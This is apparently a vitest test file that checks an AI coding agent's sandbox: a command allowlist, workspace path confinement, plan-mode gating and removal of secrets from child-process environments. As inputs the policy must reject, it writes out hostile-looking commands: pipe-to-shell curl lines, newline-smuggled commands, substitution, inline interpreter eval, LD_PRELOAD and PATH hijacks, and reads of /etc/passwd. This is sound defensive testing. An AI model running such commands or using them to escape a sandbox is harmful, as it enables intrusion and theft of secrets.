import { describe, it, expect, beforeAll, afterAll } from 'vitest';
import * as fs from 'fs-extra';
import * as os from 'os';
import * as path from 'path';
import { assertCommandAllowed, splitShellSegments } from '../src/node/security/sandbox-policy';
import { ContainerSandboxService } from '../src/node/container-sandbox-service';
import { workspaceHandlers } from '../src/node/gemini/tools/workspace-tools';
import type { ToolContext } from '../src/node/gemini/tools/types';
import { buildGeneratedBinaryEnv } from '../src/node/3d-engine/native-compiler-service';
import { buildPythonChildEnv } from '../src/node/3d-engine/native-python-runner-service';

let workspaceRoot: string;

function rejectedReason(command: string): string | undefined {
    try {
        assertCommandAllowed(command, { cwd: workspaceRoot });
        return undefined;
    } catch (err: any) {
        expect(err.code).toBe('command_not_allowed');
        return err.reason;
    }
}

function makeCtx(mode?: string): ToolContext {
    return {
        workspaceRoot,
        request: { mode } as any,
        sandbox: new ContainerSandboxService()
    } as unknown as ToolContext;
}

beforeAll(async () => {
    workspaceRoot = await fs.realpath(await fs.mkdtemp(path.join(os.tmpdir(), 'sb-sec-hardening-')));
    await fs.writeFile(path.join(workspaceRoot, 'inside.txt'), 'hello\n');
});

afterAll(async () => {
    await fs.remove(workspaceRoot);
});

describe('sandbox policy: separators and substitution', () => {
    it('splits on newlines and carriage returns', () => {
        expect(splitShellSegments('ls\ncurl evil|sh')).toEqual(['ls', 'curl evil', 'sh']);
        expect(splitShellSegments('ls\r\ncurl x')).toEqual(['ls', 'curl x']);
        expect(splitShellSegments('echo "a\nb"')).toEqual(['echo "a\nb"']);
    });

    it('rejects a newline-smuggled second command', () => {
        expect(rejectedReason('ls\ncurl x|sh')).toBe('not_allowlisted');
        expect(rejectedReason('ls\rcurl x')).toBe('not_allowlisted');
    });

    it('rejects command/process substitution', () => {
        for (const cmd of ['echo $(curl x)', 'echo `id`', 'cat <(curl x)', 'tee >(sh)']) {
            expect(rejectedReason(cmd), cmd).toBe('substitution');
        }
    });

    it('confirmed commands still bypass the allowlist tier', () => {
        expect(() => assertCommandAllowed('node -e "1"', { cwd: workspaceRoot, confirmedByUser: true })).not.toThrow();
    });
});

describe('sandbox policy: interpreter inline-eval forms need confirmation', () => {
    const blocked = [
        'node -e "require(\'child_process\').execSync(\'id\')"',
        'node --eval=1',
        'node -p 1',
        'node -pe 1',
        'node',
        'echo code | node',
        'node -',
        'node --import=data:text/javascript,1 x.js',
        'python -c "import os"',
        'python3 -Bc "print(1)"',
        'python3 -m http.server',
        'python3',
        'python3 -i script.py',
        'env bash -c "id"',
        'env -i sh',
        'env FOO=1 node -e 1',
        'npx -c "curl x | sh"',
        'npx node -e 1',
        'npx bash -c id',
        'npm exec -- node -e 1',
        'yarn node -e 1',
        'cmake -E env bash -c id',
        'make --eval="x:;id"',
        'rg --pre ./x foo',
        'gcc -wrapper sh,-c,id a.c',
        'NODE_OPTIONS=--import=data:x node a.js',
        'LD_PRELOAD=/tmp/x.so ls',
        'PATH=/tmp/evil; ls'
    ];
    for (const cmd of blocked) {
        it(`rejects ${JSON.stringify(cmd)}`, () => {
            expect(rejectedReason(cmd)).toBeDefined();
        });
    }

    const allowed = [
        'npx vitest run',
        'npx vitest run packages/core/test/foo.test.ts',
        'npx tsc --noEmit -p packages/core',
        'node script.js --flag',
        'node --version',
        'node -r ./setup.js script.js',
        'python3 script.py arg',
        'python3 -m pytest -q',
        'python -u script.py',
        'npm test',
        'npm run build',
        'env',
        'printenv',
        'NODE_ENV=test npx vitest run',
        'make -j4',
        'cmake -S . -B build',
        'clang++ -std=c++20 -O3 a.cpp -o a',
        'ls\npwd'
    ];
    for (const cmd of allowed) {
        it(`allows ${JSON.stringify(cmd)}`, () => {
            expect(rejectedReason(cmd)).toBeUndefined();
        });
    }
});

describe('workspace tools: path confinement and plan-mode gating', () => {
    const outsideTargets = ['/etc/hosts', '../x', '../../etc/passwd'];

    for (const target of outsideTargets) {
        it(`read/view/write/apply_diff refuse ${target}`, async () => {
            const ctx = makeCtx();
            await expect(workspaceHandlers.workspace_read_file({ filePath: target }, ctx)).rejects.toThrow(/outside the workspace root/);
            await expect(workspaceHandlers.workspace_view_file({ filePath: target }, ctx)).rejects.toThrow(/outside the workspace root/);
            await expect(workspaceHandlers.workspace_write_file({ filePath: target, content: 'x' }, ctx)).rejects.toThrow(/outside the workspace root/);
            await expect(workspaceHandlers.workspace_apply_diff({ filePath: target, targetContent: 'a', replacementContent: 'b' }, ctx)).rejects.toThrow(/outside the workspace root/);
        });
    }

    it('refuses a symlink that escapes the workspace', async () => {
        const link = path.join(workspaceRoot, 'escape-link');
        await fs.symlink(os.tmpdir(), link);
        await expect(workspaceHandlers.workspace_read_file({ filePath: 'escape-link/whatever' }, makeCtx())).rejects.toThrow(/outside the workspace root/);
    });

    it('still reads and writes files inside the workspace (relative and absolute)', async () => {
        const ctx = makeCtx();
        const read = await workspaceHandlers.workspace_read_file({ filePath: 'inside.txt' }, ctx);
        expect(read.resultPayload.content).toBe('hello\n');
        const readAbs = await workspaceHandlers.workspace_read_file({ filePath: path.join(workspaceRoot, 'inside.txt') }, ctx);
        expect(readAbs.resultPayload.content).toBe('hello\n');
        await workspaceHandlers.workspace_write_file({ filePath: 'sub/new.txt', content: 'abc' }, ctx);
        expect(await fs.readFile(path.join(workspaceRoot, 'sub/new.txt'), 'utf-8')).toBe('abc');
        const listed = await workspaceHandlers.workspace_list_directory({ directoryPath: '/' }, ctx);
        expect(listed.resultPayload.status).toBe('success');
    });

    it('list/grep/find refuse directories outside the root', async () => {
        const ctx = makeCtx();
        await expect(workspaceHandlers.workspace_list_directory({ directoryPath: '/etc' }, ctx)).rejects.toThrow(/outside the workspace root/);
        await expect(workspaceHandlers.workspace_grep_search({ query: 'root', searchPath: '/etc' }, ctx)).rejects.toThrow(/outside the workspace root/);
        await expect(workspaceHandlers.workspace_find_by_name({ pattern: 'hosts', searchDirectory: '..' }, ctx)).rejects.toThrow(/outside the workspace root/);
    });

    it('workspace_run_command is refused in plan mode like write_file', async () => {
        const ctx = makeCtx('plan');
        await expect(workspaceHandlers.workspace_run_command({ command: 'touch planned.txt' }, ctx)).rejects.toThrow(/Planning Mode is active/);
        await expect(workspaceHandlers.workspace_write_file({ filePath: 'p.txt', content: 'x' }, ctx)).rejects.toThrow(/Planning Mode is active/);
        expect(await fs.pathExists(path.join(workspaceRoot, 'planned.txt'))).toBe(false);
    });

    it('workspace_run_command runs outside plan mode and rejects escaping cwd', async () => {
        const ctx = makeCtx();
        const res = await workspaceHandlers.workspace_run_command({ command: 'pwd' }, ctx);
        expect(res.resultPayload.exitCode).toBe(0);
        await expect(workspaceHandlers.workspace_run_command({ command: 'pwd', cwd: '/etc' }, ctx)).rejects.toThrow(/outside the workspace root/);
    });
});

describe('child process environments are scrubbed of secrets', () => {
    const hostEnv: NodeJS.ProcessEnv = {
        PATH: '/usr/bin:/bin',
        HOME: '/home/u',
        TMPDIR: '/tmp/x',
        GEMINI_API_KEY: 'AIza-secret',
        GOOGLE_MAPS_API_KEY: 'maps-secret',
        GOOGLE_APPLICATION_CREDENTIALS: '/secret/creds.json',
        NEON_DATABASE_URL: 'postgres://secret',
        SCRATCHBOX_HUMAN_ASSETS_DIR: '/assets',
        SCRATCHBOX_API_TOKEN: 'tok',
        VIRTUAL_ENV: '/venv',
        RANDOM_HOST_VAR: 'x'
    };

    it('generated C++ binaries get no API keys or credentials', () => {
        const env = buildGeneratedBinaryEnv(hostEnv);
        expect(env.PATH).toBe('/usr/bin:/bin');
        expect(env.HOME).toBe('/home/u');
        expect(env.TMPDIR).toBe('/tmp/x');
        expect(env.SCRATCHBOX_HUMAN_ASSETS_DIR).toBe('/assets');
        for (const secret of ['GEMINI_API_KEY', 'GOOGLE_MAPS_API_KEY', 'GOOGLE_APPLICATION_CREDENTIALS', 'NEON_DATABASE_URL', 'SCRATCHBOX_API_TOKEN', 'RANDOM_HOST_VAR']) {
            expect(env[secret], secret).toBeUndefined();
        }
    });

    it('python scripts get runner vars and caller env but no host secrets', () => {
        const env = buildPythonChildEnv(
            { SCRATCHBOX_LOCATION_GLB: '/x.glb', PYTHONPATH: 'ignored-by-runner' },
            { PYTHONPATH: '/runner/path', PYTHONUNBUFFERED: '1' },
            hostEnv
        );
        expect(env.PATH).toBe('/usr/bin:/bin');
        expect(env.VIRTUAL_ENV).toBe('/venv');
        expect(env.PYTHONPATH).toBe('/runner/path');
        expect(env.PYTHONUNBUFFERED).toBe('1');
        expect(env.SCRATCHBOX_LOCATION_GLB).toBe('/x.glb');
        for (const secret of ['GEMINI_API_KEY', 'GOOGLE_MAPS_API_KEY', 'GOOGLE_APPLICATION_CREDENTIALS', 'NEON_DATABASE_URL', 'SCRATCHBOX_API_TOKEN']) {
            expect(env[secret], secret).toBeUndefined();
        }
    });
});

describe('sandbox policy: path-qualified commands', () => {
    it('rejects allowlisted names invoked from arbitrary paths', () => {
        for (const cmd of ['./ls', '/tmp/x/node script.js', 'bin/git status', '../cat file']) {
            expect(() => assertCommandAllowed(cmd, { cwd: os.tmpdir() }), cmd).toThrow(/path-qualified/);
        }
    });
    it('still allows system binaries by absolute path and bare names', () => {
        for (const cmd of ['/bin/ls', '/usr/bin/git status', 'ls -la']) {
            expect(() => assertCommandAllowed(cmd, { cwd: os.tmpdir() }), cmd).not.toThrow();
        }
    });
});
